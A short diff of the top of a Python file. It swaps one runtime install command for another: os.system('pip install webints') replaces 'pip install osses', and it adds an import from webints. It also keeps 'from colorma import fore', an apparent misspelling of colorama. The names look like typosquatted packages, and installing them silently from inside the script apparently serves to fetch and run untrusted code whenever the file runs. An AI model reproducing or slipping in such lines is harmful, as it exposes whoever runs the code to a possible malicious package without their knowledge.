@@ -1,7 +1,7 @@
 import os
 from requests import request
-os.system("pip install osses")
-from colorama import Fore
+os.system("pip install webints")
+from webints import webdriver
 from colorma import fore
 
 
